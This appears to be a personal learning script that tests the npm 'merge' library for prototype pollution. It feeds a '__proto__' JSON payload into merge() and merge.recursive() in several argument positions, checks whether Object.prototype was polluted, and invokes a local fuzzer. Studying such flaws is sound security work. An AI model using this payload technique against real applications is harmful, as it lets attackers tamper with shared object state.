let merge  = require("merge");
let fuzzer = require("/Users/camerontownshend/Documents/Cameron/dev/learnVulnerabilities/prototype-pollution/exploit/prototype-pollution-nsec18/find-vuln/find-vuln.js");
let obj1 = { name: "john", age: 22 }
let obj2 = { hometown: "liverpool", country: "UK" };
let obj3 = merge(obj1, obj2)


BAD_JSON = JSON.parse('{"__proto__":{"test":123}}');
merge(BAD_JSON);
console.log("merge is vulnerable?", {}.test); // true

merge.recursive(BAD_JSON);
console.log("merge.recursive BAD_JSON is vulnerable?", {}.test); // true

merge.recursive({}, BAD_JSON);
console.log("merge.recursive {}, BAD_JSON is vulnerable?", {}.test); // true
 
merge.recursive({}, {}, BAD_JSON);
console.log("merge.recursive {}, {}, BAD_JSON is vulnerable?", {}.test); // true
 

merge.recursive({}, {}, {}, BAD_JSON);
console.log("merge.recursive {}, {}, {}, BAD_JSON is vulnerable?", {}.test); // true
 

var fuzz = fuzzer(
  "/Users/camerontownshend/Documents/Cameron/dev/learnVulnerabilities/prototype-pollution/npm_libraries/merge/v1.2.0/node_modules/merge"
);
// console.log(fuzz);